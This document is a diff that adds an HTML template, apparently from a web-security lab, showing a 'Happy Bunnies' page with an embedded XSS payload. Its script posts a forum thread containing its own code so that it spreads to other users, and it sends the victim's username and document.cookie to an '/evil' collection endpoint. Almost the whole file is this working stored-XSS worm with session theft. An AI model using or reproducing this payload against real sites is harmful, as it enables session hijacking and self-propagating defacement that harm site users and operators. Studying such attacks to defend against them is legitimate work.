@@ -1,0 +1,17 @@
+{% extends "evil_base.html" %}
+{% block content %}
+<div>
+    <h1>Happy Bunnies</h1>
+    <img src="http://images4.fanpop.com/image/photos/19800000/baby-bunnies-baby-bunnies-19896692-1024-768.jpg" width="800" />
+    <span class="xss">
+        I own you now.
+        <script>
+        console.log("skajdfh");
+            $.get('/forum?action=new&title=Hacked+by+Happy+Bunnies&content='+
+                  encodeURIComponent($(".xss")[0].outerHTML));
+            $.get("/evil?save=cookie"+"&user="+encodeURIComponent($("#user-welcome strong").html())+"&cookie="+encodeURIComponent(document.cookie));
+        </script>
+    </span>
+    <h2> And you were hacked by Happy Bunnies</h2>
+</div>
+{% endblock %}
